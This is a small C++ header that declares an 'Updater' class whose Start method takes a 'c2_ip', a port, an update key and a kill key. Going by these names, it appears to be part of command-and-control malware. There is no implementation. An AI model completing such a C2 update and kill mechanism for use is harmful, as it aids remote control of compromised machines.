#pragma once
#include <string>

class Updater {
public:
    static void Start(const std::string& c2_ip, int port, const std::string& updateKey, const std::string& killKey);
};
